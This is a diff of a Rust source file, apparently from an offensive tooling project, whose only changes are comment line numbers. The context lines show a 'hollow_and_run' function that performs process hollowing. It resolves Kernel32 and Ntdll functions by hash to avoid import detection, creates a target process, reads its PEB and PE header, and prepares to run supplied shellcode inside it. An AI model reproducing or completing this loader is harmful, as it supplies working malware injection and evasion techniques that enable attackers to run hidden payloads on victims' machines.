@@ -11,10 +11,10 @@ const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
-    // See line 18
+    // See line 13
     let mut process_information = PROCESS_INFORMATION::default();
 
-    // See line 23
+    // See line 18
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
     let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION]; [BOOL]);
     let lp_command_line = PSTR(CString::new(target_process)
@@ -34,7 +34,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         &mut process_information
     ) };
 
-    // See line 48
+    // See line 43
     let function = rco_utils::find_function_address("Ntdll", 0x9b0d5adddbf90f8a).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32]; [()]);
     let process_handle = process_information.hProcess;
@@ -47,7 +47,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ptr::null_mut()
     ) };
 
-    // See line 65
+    // See line 60
     let function = rco_utils::find_function_address("Kernel32", 0x1c1cfbf71004cba8).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *mut c_void, usize, *mut usize]; [()]);
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
@@ -60,7 +60,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ptr::null_mut()
     ) };
 
-    // See line 83
+    // See line 78
     let mut header_buffer = [0_u8; 0x200];
     let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
     let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
@@ -75,7 +75,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
     }
 
-    // See line 102
+    // See line 97
     let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
     let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
@@ -90,7 +90,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ptr::null_mut()
     ) };
 
-    // See line 122
+    // See line 117
     let function = rco_utils::find_function_address("Kernel32", 0x9f2eb3a0195b21d).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE]; [()]);
     unsafe { function(
